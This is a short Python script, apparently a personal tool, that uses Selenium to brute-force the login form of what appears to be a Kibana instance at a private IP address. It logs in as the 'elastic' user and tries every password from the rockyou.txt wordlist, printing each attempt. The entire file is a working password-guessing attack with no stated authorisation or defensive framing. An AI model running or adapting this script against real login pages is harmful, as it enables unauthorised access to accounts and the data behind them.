from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import os
import time

initial_link = "http://172.18.6.65:5601/login?next=%2F"

options = webdriver.ChromeOptions()
options.add_argument("--start-maximized")
service = Service("C:\\Users\\davipereira\\Downloads\\chromedriver_win32\\chromedriver.exe")
driver = webdriver.Chrome(service=service, options=options)
driver.get(initial_link)

path = os.path.dirname(os.path.abspath(__file__))

wait = WebDriverWait(driver, 10)

while True:
    try:
        current_link = driver.current_url
        element = wait.until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div[3]/div[2]/div/div/div/div/div/form/div[1]/div[2]/div/div/input")))
        element.click()
        time.sleep(0.05)
        element.send_keys("elastic")

        file_name = r"\rockyou.txt"
        path_rockyou = path + file_name
        print(f"Página a ser atacada: {current_link}")

        with open(path_rockyou, errors='ignore') as f:
            words = f.read().splitlines()
            for password in words:
                if initial_link != current_link:
                    break

                try:
                    time.sleep(0.05)
                    element = driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[2]/div/div/div/div/div/form/div[2]/div[2]/div/div/input")
                    element.click()

                    time.sleep(0.05)
                    element.send_keys(Keys.CONTROL + "a")
                    element.send_keys(Keys.DELETE)

                    time.sleep(0.05)

                    element = driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[2]/div/div/div/div/div/form/div[2]/div[2]/div/div/input")
                    element.click()
                    time.sleep(0.05)
                    element.send_keys(password)
                    time.sleep(0.01)

                    element = driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[2]/div/div/div/div/div/form/div[4]/div/button/span")
                    element.click()
                    time.sleep(0.05)

                    current_link = driver.current_url

                    print(f"A password é: {password}")

                except NoSuchElementException:
                    break

    except StaleElementReferenceException:
        pass

